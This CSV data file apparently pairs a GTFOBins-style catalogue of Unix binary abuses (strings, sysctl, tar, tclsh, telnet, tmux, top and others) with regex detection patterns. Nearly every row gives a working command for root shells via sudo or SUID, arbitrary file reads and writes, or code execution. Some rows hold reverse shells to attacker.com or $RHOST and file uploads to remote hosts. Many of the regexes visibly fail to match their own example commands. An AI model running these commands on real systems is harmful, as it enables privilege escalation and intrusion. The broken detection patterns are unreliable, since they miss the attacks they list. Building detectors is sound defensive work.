Name,Function,ExampleCode,Regex,Notes
strings,file-read,"strings ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strings\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
strings,suid,"./strings ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strings\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
strings,sudo,"sudo strings ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?strings\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
su,sudo,sudo su,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?su\s+.+),
sudo,sudo,sudo sudo /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sudo\s+(?:/bin/(?:sh|bash))),
sysctl,command,"sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The command is executed by root in the background when a core dump occurs.
sysctl,file-read,"/usr/sbin/sysctl -n ""/../../$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s*\-n\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files."
sysctl,suid,"./sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
sysctl,sudo,"sudo sysctl ""kernel.core_pattern=|$COMMAND""
sleep 9999 &
kill -QUIT $!
cat /tmp/id","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?sysctl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
systemctl,suid,"echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c ""id > /tmp/output""
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s*\-c\s*\-\-now\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
systemctl,sudo,"echo /bin/sh >$TF
chmod +x $TF
sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
systemctl,sudo,"echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c ""id > /tmp/output""
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s*\-c\s*\-\-now\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
systemctl,sudo,"sudo systemctl
!sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemctl\s+.+),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
systemd-resolve,sudo,"sudo systemd-resolve --status
!sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?systemd\-resolve\s*\-\-status\s+.+),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
tac,file-read,"tac -s 'RANDOM' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tac,suid,"./tac -s 'RANDOM' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tac,sudo,"sudo tac -s 'RANDOM' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tac\s*\-s\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tail,file-read,"tail -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tail\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tail,suid,"./tail -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tail\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tail,sudo,"sudo tail -c1G ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tail\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tar,shell,tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-checkpoint\s*\-\-checkpoint\-action\s+(?:/bin/(?:sh|bash))),
tar,shell,"tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-I\s*\-c\s+(?:/bin/(?:sh|bash))),This only works for GNU tar.
tar,shell,"echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-to\-command\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar. It can be useful when only a limited command argument injection is available.
tar,file-upload,tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-rsh\-command\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
tar,file-download,tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-rsh\-command\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).
tar,file-write,"echo DATA > ""$TF""
tar c --xform ""s@.*@$LFILE@"" -OP ""$TF"" | tar x -P","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-xform\s*\-P\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar.
tar,file-read,"tar xf ""$LFILE"" -I '/bin/sh -c ""cat 1>&2""'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-I\s*\-c\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for GNU tar.
tar,sudo,sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-checkpoint\s*\-\-checkpoint\-action\s+(?:/bin/(?:sh|bash))),
tar,limited-suid,./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tar\s*\-\-checkpoint\s*\-\-checkpoint\-action\s+(?:/bin/(?:sh|bash))),
task,shell,task execute /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?task\s+(?:/bin/(?:sh|bash))),
task,sudo,sudo task execute /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?task\s+(?:/bin/(?:sh|bash))),
taskset,shell,taskset 1 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?taskset\s+(?:/bin/(?:sh|bash))),
taskset,suid,./taskset 1 /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?taskset\s*\-p\s+(?:/bin/(?:sh|bash))),
taskset,sudo,sudo taskset 1 /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?taskset\s+(?:/bin/(?:sh|bash))),
tasksh,shell,"tasksh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tasksh,limited-suid,"./tasksh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tasksh,sudo,"sudo tasksh
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tasksh\s+(?:/bin/(?:sh|bash))),
tbl,file-read,tbl $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tbl,suid,./tbl $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tbl,sudo,sudo tbl $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tbl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tclsh,shell,"tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:/bin/(?:sh|bash))),
tclsh,non-interactive-reverse-shell,"export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
tclsh,suid,"./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s*\-p\s+(?:/bin/(?:sh|bash))),
tclsh,sudo,"sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tclsh\s+(?:/bin/(?:sh|bash))),
tcpdump,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tcpdump\s*\-i\s*\-w\s*\-W\s*\-G\s*\-z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tcpdump,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tcpdump\s*\-i\s*\-w\s*\-W\s*\-G\s*\-z\s*\-Z\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tdbtool,shell,"tdbtool
! /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tdbtool,sudo,"sudo tdbtool
! /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tdbtool,limited-suid,"./tdbtool
! /bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tdbtool\s+(?:/bin/(?:sh|bash))),
tee,file-write,"echo DATA | ./tee -a ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tee,suid,"echo DATA | ./tee -a ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tee,sudo,"echo DATA | sudo tee -a ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tee\s*\-a\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
telnet,shell,"telnet $RHOST $RPORT
^]
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",BSD version only. Needs to be connected first.
telnet,reverse-shell,mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
telnet,sudo,"sudo telnet $RHOST $RPORT
^]
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",BSD version only. Needs to be connected first.
telnet,limited-suid,"./telnet $RHOST $RPORT
^]
!/bin/sh","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?telnet\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",BSD version only. Needs to be connected first.
terraform,file-read,"terraform console
file(""file_to_read"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
terraform,sudo,"sudo terraform console
file(""file_to_read"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
terraform,suid,"./terraform console
file(""file_to_read"")","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?terraform\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tex,shell,tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tex,sudo,sudo tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tex,limited-suid,./tex --shell-escape '\write18{/bin/sh}\end',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tex\s*\-\-shell\-escape\s+(?:/bin/(?:sh|bash))),
tftp,file-upload,"tftp $RHOST
put file_to_send","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a TFTP server.
tftp,file-download,"tftp $RHOST
get file_to_get","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a TFTP server.
tftp,suid,"./tftp $RHOST
put file_to_send","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a TFTP server.
tftp,sudo,"sudo tftp $RHOST
put file_to_send","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a TFTP server.
tic,file-read,"tic -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tic,suid,"./tic -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tic,sudo,"sudo tic -C ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tic\s*\-C\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
time,shell,/usr/bin/time /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?time\s+(?:/bin/(?:sh|bash))),
time,suid,./time /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?time\s*\-p\s+(?:/bin/(?:sh|bash))),
time,sudo,sudo /usr/bin/time /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?time\s+(?:/bin/(?:sh|bash))),
timedatectl,shell,"timedatectl list-timezones
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timedatectl\s+(?:/bin/(?:sh|bash))),
timedatectl,sudo,"sudo timedatectl list-timezones
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timedatectl\s+(?:/bin/(?:sh|bash))),
timeout,shell,timeout 7d /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timeout\s+(?:/bin/(?:sh|bash))),
timeout,suid,./timeout 7d /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timeout\s*\-p\s+(?:/bin/(?:sh|bash))),
timeout,sudo,sudo timeout --foreground 7d /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?timeout\s*\-\-foreground\s+(?:/bin/(?:sh|bash))),
tmate,shell,tmate -c /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmate,sudo,sudo tmate -c /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmate,limited-suid,./tmate -c /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmate\s*\-c\s+(?:/bin/(?:sh|bash))),
tmux,file-read,tmux -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmux\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message."
tmux,shell,tmux,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmux\s+.+),
tmux,shell,tmux -S /path/to/socket_name,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmux\s*\-S\s+.+),Provided to have enough permissions to access the socket.
tmux,sudo,sudo tmux,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tmux\s+.+),
top,shell,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
reset",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?top\s*\-e\s+(?:/bin/(?:sh|bash))),
top,sudo,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
reset",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?top\s*\-e\s+(?:/bin/(?:sh|bash))),This requires that the root configuration file is writable and might be used to persist elevated privileges.
torify,shell,torify /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?torify\s+(?:/bin/(?:sh|bash))),
torify,sudo,sudo torify /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?torify\s+(?:/bin/(?:sh|bash))),
torsocks,shell,torsocks /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?torsocks\s+(?:/bin/(?:sh|bash))),
torsocks,sudo,sudo torsocks /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?torsocks\s+(?:/bin/(?:sh|bash))),
troff,file-read,troff $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
troff,suid,./troff $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
troff,sudo,sudo troff $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?troff\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
tshark,shell,"echo 'os.execute(""/bin/sh"")' >$TF
tshark -Xlua_script:$TF","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?tshark\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,file-read,"ul ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,suid,"./ul ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ul,sudo,"sudo ul ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ul\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,file-read,"unexpand -t99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,suid,"./unexpand -t99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unexpand,sudo,"sudo unexpand -t99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unexpand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,file-read,"uniq ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,suid,"./uniq ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
uniq,sudo,"sudo uniq ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?uniq\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
unshare,shell,unshare /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?unshare\s+(?:/bin/(?:sh|bash))),
